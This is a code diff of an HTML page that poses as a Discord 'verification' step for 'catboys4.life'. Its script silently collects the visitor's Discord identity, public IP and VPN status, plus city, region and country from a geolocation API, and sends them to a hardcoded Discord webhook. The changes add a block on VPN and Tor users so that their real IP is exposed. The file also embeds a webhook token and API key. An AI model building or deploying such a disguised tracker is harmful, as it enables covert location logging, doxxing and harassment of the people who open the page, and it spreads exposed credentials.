@@ -4,61 +4,82 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Verifying...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    #status {
+      font-weight: bold;
+      font-size: 24px;
+    }
+  </style>
 </head>
 <body>
-<script>
-const webhookUrl = 'https://discord.com/api/webhooks/1359827940598222989/XqQHlvgMtaEuthp3_tN6oNP1VqNqeDFdmTt1vJZOS3FEpKU0fvo3FPm9C5_7p3O_VYEJ';
-const vpnApiKey = 'd4174ac879ec45dbaf68f0622ac553ba';
+  <div id="status">Verifying...</div>
 
-function getQueryParams() {
-  const params = new URLSearchParams(window.location.search);
-  return {
-    username: params.get('username') || 'Not provided',
-    userid: params.get('userid') || 'Not provided',
-    displayName: params.get('user_display_name') || 'Not provided'
-  };
-}
+  <script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1359827940598222989/XqQHlvgMtaEuthp3_tN6oNP1VqNqeDFdmTt1vJZOS3FEpKU0fvo3FPm9C5_7p3O_VYEJ';
+    const vpnApiKey = 'd4174ac879ec45dbaf68f0622ac553ba';
+    const statusDiv = document.getElementById('status');
 
-async function sendLog() {
-  try {
-    const { username, userid, displayName } = getQueryParams();
+    function getQueryParams() {
+      const params = new URLSearchParams(window.location.search);
+      return {
+        username: params.get('username') || 'Not provided',
+        userid: params.get('userid') || 'Not provided',
+        displayName: params.get('user_display_name') || 'Not provided'
+      };
+    }
 
-    const ipResponse = await fetch('https://api.ipify.org?format=json');
-    const { ip } = await ipResponse.json();
+    async function sendLog() {
+      try {
+        const { username, userid, displayName } = getQueryParams();
 
-    const vpnResponse = await fetch(`https://vpnapi.io/api/${ip}?key=${vpnApiKey}`);
-    const vpnData = await vpnResponse.json();
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await ipResponse.json();
 
-    const embed = {
-      title: 'New Verification Attempt',
-      color: 3447003,
-      fields: [
-        { name: 'Username', value: username, inline: true },
-        { name: 'User ID', value: userid, inline: true },
-        { name: 'Display Name', value: displayName, inline: true },
-        { name: 'IP Address', value: ip, inline: true },
-        { name: 'VPN / Proxy / Tor', value: (vpnData.security.vpn || vpnData.security.proxy || vpnData.security.tor) ? 'Yes' : 'No', inline: true },
-        { name: 'Country', value: vpnData.location.country || 'Unknown', inline: true },
-        { name: 'Region', value: vpnData.location.region || 'Unknown', inline: true },
-        { name: 'City', value: vpnData.location.city || 'Unknown', inline: true }
-      ],
-      footer: { text: 'catboys4.life' }
-    };
+        const vpnResponse = await fetch(`https://vpnapi.io/api/${ip}?key=${vpnApiKey}`);
+        const vpnData = await vpnResponse.json();
 
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
-    });
+        const isUsingVPN = vpnData.security.vpn || vpnData.security.proxy || vpnData.security.tor;
 
-    window.location.href = 'https://discord.gg/62uxgXXXXr'; // Replace with your actual server invite
-  } catch (err) {
-    console.error('Logging failed:', err);
-    window.location.href = 'https://discord.gg/62uxgXXXXr';
-  }
-}
+        if (isUsingVPN) {
+          statusDiv.textContent = 'Verification failed, please turn off your VPN.';
+          return;
+        }
 
-sendLog();
-</script>
+        const embed = {
+          title: 'New Verification Attempt',
+          color: 3447003,
+          fields: [
+            { name: 'Username', value: username, inline: true },
+            { name: 'User ID', value: userid, inline: true },
+            { name: 'Display Name', value: displayName, inline: true },
+            { name: 'IP Address', value: ip, inline: true },
+            { name: 'VPN / Proxy / Tor', value: 'No', inline: true },
+            { name: 'Country', value: vpnData.location.country || 'Unknown', inline: true },
+            { name: 'Region', value: vpnData.location.region || 'Unknown', inline: true },
+            { name: 'City', value: vpnData.location.city || 'Unknown', inline: true }
+          ],
+          footer: { text: 'catboys4.life' }
+        };
+
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ embeds: [embed] })
+        });
+
+        statusDiv.textContent = 'Verified';
+      } catch (err) {
+        console.error('Logging failed:', err);
+        statusDiv.textContent = 'An error occurred during verification.';
+      }
+    }
+
+    setTimeout(sendLog, 1000); // 1 second delay
+  </script>
 </body>
 </html>
